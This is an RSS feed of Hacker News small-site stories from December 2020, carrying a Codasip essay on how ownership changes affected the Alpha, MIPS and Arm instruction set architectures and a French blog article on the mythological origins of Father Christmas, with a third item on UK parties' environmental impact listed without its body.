<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 25 Dec 2020 04:45:37 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 25 Dec 2020 04:45:37 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Does ISA Ownership Matter? A Tale of Three ISAs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516090">thread link</a>) | @todsacerdoti
<br/>
December 23, 2020 | https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/ | <a href="https://web.archive.org/web/*/https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div id="cs-content"><div id="x-section-1"><div><div><div><p>An instruction set architecture (ISA) is crucial to the development of processors and their software ecosystems. In the last half century, the majority of ISAs have been owned by single companies, whether product companies for their own chips/systems or processor IP companies who licensed their processors to chip developers. Does <strong>ISA ownership</strong> matter? Letâ€™s consider three proprietary ISAs and their history.</p>
<p>Firstly, the Alpha ISA was developed by Digital Equipment Corporation (DEC) for its workstations and servers and was released in 1992. In the mid-1990s, this was considered a&nbsp;worthy competitor to SPARC and MIPS RISC architectures. However, the ownership of the ISA transferred to Compaq when DEC was acquired in 1998. Compaq in turn sold the rights to the Alpha ISA to Intel in 2001, and in the same year Compaq was acquired by Hewlett Packard. The last Alpha-based products were released in 2004, meaning that the ISA was effectively dead because of a&nbsp;series of acquisitions.</p>
<p>MIPS Technologies was spun out of Silicon Graphics as an independent IP company in 1998. For some years it enjoyed some success, particularly at the higher end of the processor IP market, and was only the second architecture to have Android ported in 2009. However, with a&nbsp;declining share price, MIPS sold 498 patents to AST and agreed to an acquisition by Imagination Technology in 2013. After Canyon Bridge acquired Imagination, MIPS was spun-out again ending up, after a&nbsp;series of transactions, as part of Wave Computing. As an artificial intelligence silicon provider, Wave is a&nbsp;potential competitor to some MIPS licensees.</p>
<p>Wave tried to encourage the adoption of the MIPS ISA in competition to RISC-V through their MIPS Open Initiative in late 2018. However, the licensing terms contained some onerous conditions relating to patents. In late 2019, Wave suddenly shut down the program, giving zero notice. The important lesson is that even if an ISA is open, its future is not secure if it is commercially owned. Seven years of ownership change have seen MIPSâ€™ market share spiral downwards.</p>
<p>The third example is Arm, the biggest processor IP company of them all. Arm has long been seen as not only a&nbsp;big, successful IP company, but one offering â€œSwiss neutralityâ€ in the semiconductor industry. Arm was quite distinct from both semiconductor companies and EDA companies. As such, it enjoyed a&nbsp;position of trust from its licensees as it did not have a conflict of interest. With its acquisition by SoftBank in 2016, Arm lost control over its destiny, even though SoftBank was not competing with its licensees. With the planned acquisition of Arm by NVIDIA, announced in September 2020, Arm will lose its neutrality completely. As a&nbsp;semiconductor company, there is a&nbsp;conflict of interest between Armâ€™s owners and its licensees, meaning it can no longer be trusted in the same way.</p>
<p>As can be seen from the â€˜Tale of three ISAsâ€™, the <strong>ownership</strong> of an ISA matters a&nbsp;lot, regardless of whether the ISA is commercially licensed or open. Acquisitions can lead to the disappearance of an ISA through merging of product lines or through making licensing difficult. Another motive for taking over a&nbsp;company can even be to kill off a&nbsp;competing product line, which in the case of an ISA could catastrophically impact licensees.</p>
<p>ISA ownership is one of the key issues that the developers of RISC-V have thought about. By transferring the ownership of the ISA to RISC-V International, the original developers of the ISA have assured its longevity. Longevity is assured both by the <strong>independent ownership of the ISA</strong> and the fact that licensees have a&nbsp;<strong>choice of IP vendors</strong> supporting the same open standard. Thirdly, once ratified, the ISA is <strong>frozen</strong> assuring software developers that their code will be able run on suitable cores indefinitely.</p>
<p><strong>Roddy Urquhart</strong></p>
</div></div></div></div></div>
</div>
</div></div>]]>
            </description>
            <link>https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516090</guid>
            <pubDate>Wed, 23 Dec 2020 09:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GÃ©nÃ©alogie du PÃ¨re NoÃ«l ou ses origines mythologiques]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516089">thread link</a>) | @Kenoben
<br/>
December 23, 2020 | https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/ | <a href="https://web.archive.org/web/*/https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   		
<p><em><strong>Depuis la civilisation, divinitÃ©s, fÃªtes et phÃ©nomÃ¨nes naturels sont Ã©troitement corrÃ©lÃ©s. Le PÃ¨re NoÃ«l est lâ€™aboutissement dâ€™une succession de personnages mythologiques occidentaux dont il conserve encore certains attributs.</strong></em></p>



<h4><strong>Trouvez les points communs</strong></h4>



<p>En des temps prÃ©-chrÃ©tiens, le dieu principal de la mythologie scandinave, Odin fend les airs sur le dos de <a href="https://fr.wikipedia.org/wiki/Sleipnir">Sleipnir</a> son cheval Ã  huit pattes, distribuant des cadeaux de toit en toit.</p>



<figure><ul><li><figure><img loading="lazy" width="500" height="733" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer.jpg" alt="" data-id="5359" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer.jpg 500w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer-205x300.jpg 205w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>Odin le Vagabond- Georg von Rosen â€“ 1886</figcaption></figure></li></ul></figure>



<p>Son fils, le puissant dieu de la foudre, <a href="https://fr.wikipedia.org/wiki/Thor">Thor</a>, se dÃ©place, vÃªtu de rouge, sur un char tirÃ© par des boucs.</p>



<div><figure><img loading="lazy" width="708" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-708x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-708x1024.jpg 708w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-208x300.jpg 208w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff.jpg 747w" sizes="(max-width: 708px) 100vw, 708px"><figcaption>Thor contre les gÃ©ants â€“ Marten Eskill Winge â€“ 1872</figcaption></figure></div>



<p>Le dieu solaire gaulois Belenos porte une hotte et des bottes.</p>



<p>Son successeur, le dieu romain Apollon conduit le char du soleil autour de la terre pour rÃ©pandre la lumiÃ¨re.</p>



<br>



<h4><strong>De Saint-Nicolas au PÃ¨re NoÃ«l</strong></h4>



<p>En 270 aprÃ¨s JÃ©sus Christ Nicolas nait dans la citÃ© de Patara, en Turquie actuelle. Converti jeune au christianisme, il devient Ã©vÃªque de Myre. Les Romains le dÃ©capitent un 6 dÃ©cembre vers 350 aprÃ¨s JÃ©sus Christ. Une fontaine dâ€™huile sainte aurait jailli de son cou. Mort en martyr, il est canonisÃ©.</p>



<p>Une lÃ©gende rapporte quâ€™en 1087, des moines montrent le tombeau Ã  des soldats croisÃ©s originaires dâ€™Italie. Ils ouvrent le cercueil oÃ¹ les ossements baignent dans lâ€™huile. Ils sâ€™en emparent et lâ€™apportent Ã  Bari. Des bonimenteurs profitent de lâ€™histoire pour sâ€™enrichir en vendant une fausse huile sainte guÃ©risseuse Ã  des malades superstitieux.</p>



<p>Au XIIe siÃ¨cle, Aubert de VarangÃ©ville un chevalier de retour de croisade, passe par Bari oÃ¹ il prend Â«&nbsp;la phalange dâ€™un doigt bÃ©nissant&nbsp;Â». Il lâ€™emporte chez lui Ã  Port en Lorraine, devenue Saint-Nicolas-de-Port.&nbsp;</p>



<p>Le culte du saint grandit et devient trÃ¨s populaire dans lâ€™est et le nord de la France, en Belgique, aux Pays Bas et en Allemagne.</p>



<p>Une des lÃ©gendes les plus cÃ©lÃ¨bres parle dâ€™un boucher ayant tuÃ© trois petits enfants pour les mettre au saloir. Saint Nicolas passant par-lÃ , les ressuscite. Le boucher devient son compagnon, le redoutÃ© PÃ¨re Fouettard, craint des enfants mÃ©chants. Ensemble, ils dÃ©filent le 6 dÃ©cembre, accompagnÃ©s parfois dit-on en France depuis le&nbsp;XIIe siÃ¨cle, par un vieillard appelÃ© plus tard Â«&nbsp;NoÃ«l&nbsp;Â».&nbsp;</p>



<figure><img loading="lazy" width="999" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-999x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-999x1024.jpg 999w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-293x300.jpg 293w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-768x787.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-1499x1536.jpg 1499w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-1998x2048.jpg 1998w" sizes="(max-width: 999px) 100vw, 999px"><figcaption>La Bastide Clairence Ã©glise Notre-Dame-Saint-Nicolas- Landes, France â€“ CrÃ©dit photo Daniel Villafruela</figcaption></figure>



<p>Protecteur des Ã©coliers, Saint Nicolas rÃ©compense les enfants sages dans la nuit du 5 au 6 dÃ©cembre. Ils posent leurs souliers devant la cheminÃ©e ou devant la porte pour que Saint Nicolas y dÃ©pose un cadeau. En retour, les enfants prÃ©parent du sucre, du lait et une carotte pour la mule du saint.</p>



<div><figure><img loading="lazy" width="654" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-654x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-654x1024.jpg 654w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-192x300.jpg 192w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-768x1203.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5.jpg 956w" sizes="(max-width: 654px) 100vw, 654px"></figure></div>



<br>



<h4><strong>Convergences des genres</strong></h4>



<p>Avec la <a href="https://fr.wikipedia.org/wiki/R%C3%A9forme_protestante">RÃ©forme</a>, les protestants relÃ¨guent les saints pour se concentrer sur les figures principales de la chrÃ©tientÃ©. Si lâ€™enfant JÃ©sus, le Â«&nbsp;<em><a href="https://fr.wikipedia.org/wiki/Christkindel">Christkindel</a>&nbsp;Â»</em> parfois reprÃ©sentÃ© par une jeune fille, supplante Saint Nicolas en Allemagne, <em>Sinter Klaas</em> se maintient aux Pays-Bas. Mais le Â«&nbsp;<em>Christkindel</em>&nbsp;Â» est trop petit pour conduire le traÃ®neau et trop chÃ©tif pour soulever une hotte ou un sac de cadeauxâ€¦</p>



<div><figure><img loading="lazy" width="819" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-819x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-819x1024.jpg 819w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-240x300.jpg 240w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-768x960.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-1229x1536.jpg 1229w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-1639x2048.jpg 1639w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-scaled.jpg 2048w" sizes="(max-width: 819px) 100vw, 819px"><figcaption>Christkind â€“ MusÃ©e de Bouxwiller Bas-Rhin</figcaption></figure></div>



<p>Au XVIIIe siÃ¨cle en Allemagne ressurgissent le petit peuple des&nbsp;fÃ©es, des&nbsp;elfes&nbsp;etâ€¦ le Â«&nbsp;<em><a href="https://de.wikipedia.org/wiki/Weihnachtsmann">Weihnachtsmann</a>&nbsp;Â»</em>, lâ€™homme de NoÃ«l, qui se dÃ©place en traÃ®neau offrant des sapins dÃ©corÃ©s de cadeaux.</p>



<div><figure><img loading="lazy" width="655" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-655x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-655x1024.jpg 655w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-192x300.jpg 192w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-768x1200.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-983x1536.jpg 983w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-1311x2048.jpg 1311w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-scaled.jpg 1639w" sizes="(max-width: 655px) 100vw, 655px"></figure></div>



<p>Dans les contrÃ©es nordiques, câ€™est le <a href="https://fr.wikipedia.org/wiki/Nisse_(folklore)">nisse</a> ou le tomte, des lutins, qui interviennent Ã  la fÃªte du milieu de lâ€™hiver, la&nbsp;Â«&nbsp;<em>Midtvintersblo</em>, gratifiant les humains de cadeaux.</p>



<figure><img loading="lazy" width="838" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-838x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-838x1024.jpg 838w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-246x300.jpg 246w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-768x938.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912.jpg 884w" sizes="(max-width: 838px) 100vw, 838px"><figcaption>Julbocken â€“ John Bauer â€“ 1912</figcaption></figure>



<p>Fin du&nbsp;XVIIe siÃ¨cle, des gravures anglaises figurent le Â«&nbsp;<em>Father Christmas</em>&nbsp;Â», Â«&nbsp;<em>Sir Christmas</em>&nbsp;Â» ou Â«&nbsp;<em>Lord Christmas</em>&nbsp;Â». Ã€ lâ€™instar du Dieu Odin, une longue cape Ã  capuche verte couvre ses Ã©paules et sa tÃªte est ceinte dâ€™une couronne de fleurs, de lierre ou de gui. Passant de maison en maison, il sâ€™invite Ã  table. Lui faire bon accueil garantit un hiver clÃ©ment.<strong></strong></p>



<p>Vers 1870-1890 en France, le PÃ¨re NoÃ«l est un vieillard chenu dont le manteau est&nbsp;tour Ã  tour vert, bleu, jaune, violet, orange, voire brun. Il passe au rouge juste avant 1914. </p>



<p>Il coexiste avec le maigre et austÃ¨re Â«&nbsp;Bonhomme NoÃ«l&nbsp;Â» ou Â«&nbsp;PÃ¨re Janvier&nbsp;Â» couvert de vÃªtements dâ€™hiver blancs et rouges. Antipathique, il punit les enfants dÃ©sobÃ©issants Ã  coups de baguettes glissÃ©es dans sa ceinture. Sâ€™il partage avec Saint Nicolas dâ€™arborer une barbe blanche et de porter parfois une bure, la comparaison sâ€™arrÃªte lÃ .</p>



<p>SimultanÃ©ment, lâ€™Â«&nbsp;Enfant JÃ©sus&nbsp;Â» est bien prÃ©sent.</p>



<div><figure><img loading="lazy" width="1024" height="654" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1024x654.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1024x654.jpg 1024w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-300x191.jpg 300w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-768x490.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1536x980.jpg 1536w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-2048x1307.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<br>



<h4><strong>Un personnage de synthÃ¨se</strong></h4>



<p>Au XVIIe siÃ¨cle, Saint Nicolas voyage jusquâ€™en AmÃ©rique avec les colons hollandais. Celui quâ€™ils appellent <em>Sinterclaes</em> y deviendra <em>Santa Claus</em> puis le <em>PÃ¨re NoÃ«l</em>.</p>



<p>Deux pratiques coexistent, les migrants francophones catholiques sâ€™attachent Ã  lâ€™enfant JÃ©sus, tandis que les anglophones maintiennent la tradition dâ€™un&nbsp;Santa Claus distribuant des cadeaux.</p>



<p>En 1809, pour <a href="https://fr.wikipedia.org/wiki/Washington_Irving">Washington Irving</a>, Saint Nicolas est un vieux lutin&nbsp;qui&nbsp;<em>Â«&nbsp;sâ€™envole au-dessus des arbres dans un chariot volant, transportant ses cadeaux aux enfants&nbsp;Â».</em></p>



<p>En 1821, dans le livre<em> Â«&nbsp;Un Cadeau pour le nouvel an aux petits de cinq Ã  douze ans</em>&nbsp;Â» Ã©ditÃ© Ã  New York, un poÃ¨me anonyme parle du Â«&nbsp;Old Santa Claus&nbsp;Â».</p>



<p>En 1822, un autre poÃ¨me Ã©ditÃ© anonymement et attribuÃ© au pasteur amÃ©ricain <a href="https://fr.wikipedia.org/wiki/Clement_Clarke_Moore">Clement Clarke Moore</a>, Â«&nbsp;<a href="https://fr.wikipedia.org/wiki/A_Visit_from_St._Nicholas">Une visite de saint Nicolas</a>&nbsp;Â»&nbsp;raconte le&nbsp;<em>Â«&nbsp;petit vieux gaillard et ventripotent de St Nick&nbsp;Â»</em> se dÃ©plaÃ§ant dans un traÃ®neau tirÃ© par huit rennes sur les toits au son des clochettes. VÃªtu dâ€™un manteau de fourrure il distribue des cadeaux en passant par la cheminÃ©e.</p>



<p>Depuis 1823, on connaÃ®t les noms des huit rennes du PÃ¨re NoÃ«l&nbsp;: Tornade, Danseur, Furie, Fringant, ComÃ¨te, Cupidon, Ã‰clair et Tonnerre. Ils deviennent, dÃ¨s lors, les sujets de nombreux livres puis plus tard de films dâ€™animations pour les enfants.</p>



<p>En 1939 le poÃ¨te <a href="https://fr.wikipedia.org/wiki/Robert_L._May">Robert L. May</a> invente lâ€™histoire de <em><a href="https://fr.wikipedia.org/wiki/Rudolphe_le_renne_au_nez_rouge">Rudolphe le renne au nez rouge</a></em>.</p>



<div><figure><img loading="lazy" width="673" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-673x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-673x1024.jpg 673w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-197x300.jpg 197w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-768x1169.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-1009x1536.jpg 1009w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus.jpg 1183w" sizes="(max-width: 673px) 100vw, 673px"></figure></div>





<h4><strong>Du personnage mythologique Ã  la figure commerciale</strong></h4>



<p>En 1838, <a href="https://fr.wikipedia.org/wiki/Robert_Walter_Weir">Robert Walter Weir</a> dessine Saint Nicolas pour la premiÃ¨re fois en costume rouge et blanc sous les traits dâ€™un lutin grincheux dont la petite taille lui permet de glisser dans une cheminÃ©e.</p>



<p>En 1863, <a href="https://en.wikipedia.org/wiki/Thomas_Nast">Thomas Nast</a>, AmÃ©ricain nÃ© en Allemagne, publie dans le journal new-yorkais <a href="https://en.wikipedia.org/wiki/Harper%27s_Weekly">Harperâ€™s Weekly</a> le dessin en noir et blanc dâ€™un personnage bedonnant, vÃªtu de fourrure, dâ€™une ceinture noire et dâ€™un bonnet. Il viendrait du pÃ´le Nord, rÃ©gion froide, mystÃ©rieuse et alors encore inexplorÃ©e. Plus tard ses dessins seront mis en couleur selon les modes du moment.</p>



<figure><img loading="lazy" width="719" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-719x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-719x1024.jpg 719w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-211x300.jpg 211w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-768x1094.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-1078x1536.jpg 1078w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-1438x2048.jpg 1438w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav.jpg 1685w" sizes="(max-width: 719px) 100vw, 719px"><figcaption>Thomas Nast â€“ Harpers Weekly â€“ 1863</figcaption></figure>



<p>En 1921, <a href="https://fr.wikipedia.org/wiki/Norman_Rockwell">Norman Rockwell</a> colore Â«&nbsp;Saint Nick&nbsp;Â» de rouge pour la couverture de<em>&nbsp;The Country Gentleman.</em>&nbsp;</p>



<div><figure><img loading="lazy" width="748" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-748x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-748x1024.jpg 748w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-219x300.jpg 219w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-768x1052.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus.jpg 977w" sizes="(max-width: 748px) 100vw, 748px"><figcaption>Norman Rockwell â€“ The Country Gentleman â€“ 1921</figcaption></figure></div>



<p>En 1931, <a href="https://fr.wikipedia.org/wiki/Haddon_Sundblom">Haddon Sundblom</a>, AmÃ©ricain dâ€™origine suÃ©doise, dessine pour la sociÃ©tÃ© Coca-Cola, le PÃ¨re NoÃ«l Ã  taille humaine tout en lui conservant sa bonhommie, ses rondeurs et sa figure joviale. Pour trouver de nouveaux marchÃ©s pour le soda pendant lâ€™hiver amÃ©ricain, la sociÃ©tÃ© exporte la boisson vers des pays chauds oÃ¹ la saison estivale bat son plein. Câ€™est ainsi que lâ€™image du PÃ¨re NoÃ«l accompagne avec le soda Ã  travers le monde.</p>



<br>



<h4><strong>PÃ¨re NoÃ«l ou Enfant JÃ©sus, faut-il choisir ?</strong></h4>



<p>Dans lâ€™Europe de lâ€™aprÃ¨s-guerre, le PÃ¨re NoÃ«l exaspÃ¨re les ChrÃ©tiens. Le PÃ¨re NoÃ«l commercial a pris le pas sur la cÃ©lÃ©bration de la naissance de JÃ©sus. En 1951 le sujet fait vivement dÃ©bat en France au point que des politiques de renom dÃ©battent. </p>



<p>Le journal<em>&nbsp;La Croix&nbsp;</em>rapporte Â«&nbsp;une campagne des mouvements catholiques contre le PÃ¨re NoÃ«l&nbsp;Â»&nbsp;: un curÃ© en brÃ»le une effigie accrochÃ©e aux barreaux de la cathÃ©drale de Dijon devant des enfants choquÃ©s. La presse fait Ã©cho.</p>



<p>Lâ€™ultra commercialisation de la fÃªte de NoÃ«l depuis la seconde moitiÃ© du XIXe siÃ¨cle fait craindre la perte de sens de la cÃ©lÃ©bration religieuse.</p>



<div><figure><img loading="lazy" width="818" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-818x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-818x1024.jpg 818w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-240x300.jpg 240w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-768x962.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-1227x1536.jpg 1227w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-1635x2048.jpg 1635w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair.jpg 2041w" sizes="(max-width: 818px) 100vw, 818px"></figure></div>



<p>Mais lâ€™anthropologue <a href="https://fr.wikipedia.org/wiki/Claude_L%C3%A9vi-Strauss">Claude LÃ©vi-Strauss</a> dÃ©fend le PÃ¨re NoÃ«l quâ€™il considÃ¨re comme la Â«&nbsp;divinitÃ© dâ€™une classe dâ€™Ã¢ge&nbsp;Â» . </p>



<p>La psychanalyste <a href="https://fr.wikipedia.org/wiki/Fran%C3%A7oise_Dolto">FranÃ§oise Dolto</a> insiste sur lâ€™utilitÃ© du PÃ¨re NoÃ«l. Pour elle, le moment de la dÃ©mystification du personnage est un rite de passage dâ€™un Ã¢ge vers un autre. Elle est dâ€™ailleurs soutenue dans sa conviction par son frÃ¨re, ministre de <a href="https://www.laposte.fr/lettre-pere-noel">la Poste</a> qui lui confie en 1962 la tÃ¢che de mettre en place une carte-rÃ©ponse type pour rÃ©pondre aux enfants qui Ã©crivent au PÃ¨re NoÃ«l. Depuis si le systÃ¨me sâ€™est modernisÃ©, il existe toujours, en France comme ailleurs. Ici <a href="https://pere-noel.laposte.fr/">le SecrÃ©tariat</a> du PÃ¨re NoÃ«l franÃ§ais, lÃ , <a href="https://www.laposte.fr/lettre-pere-noel">la lettre-type</a> Ã  envoyer par la Poste franÃ§aise.</p>



<p>Il existe, en Laponie, <a href="https://santaclausvillage.info/fr/">le village du PÃ¨re NoÃ«l</a>. Lâ€™occasion dâ€™un fabuleux voyage dans une contrÃ©e extrÃªme oÃ¹ le frisson du grand froid le dispute Ã  lâ€™excitation de vivre un rÃªve dâ€™enfant.</p>



<p>Dans un monde en quÃªte de sens, mais oÃ¹ petits et grands sâ€™attachent Ã  des personnages fictifs aux figures sympathiques et oÃ¹ le commerce se veut divertissement pour mieux sÃ©duire, gageons que le PÃ¨re NoÃ«l a encore de beaux jours devant lui.</p>



<h4><strong>Pour aller plus loin</strong></h4>



<div><div>
<ul><li>Arbre gÃ©nÃ©alogique du PÃ¨re NoÃ«l selon Jean-Claude BAUDOT, illustration de Jean-Michel SAGNOLS, 1986 â€“ 30 x 40 cm</li></ul>
</div></div>



<ul><li>Â« Biographie du PÃ¨re NoÃ«l Â» Catherine LEPAGNOL, Ã©dition Hachette, 1979</li></ul>

   	</div></div>]]>
            </description>
            <link>https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516089</guid>
            <pubDate>Wed, 23 Dec 2020 09:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What UK Political Party has the largest impact?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25515845">thread link</a>) | @drydenwilliams
<br/>
December 23, 2020 | https://ecoping.earth/indexes/gb/politicalparties | <a href="https://web.archive.org/web/*/https://ecoping.earth/indexes/gb/politicalparties">archive.org</a>
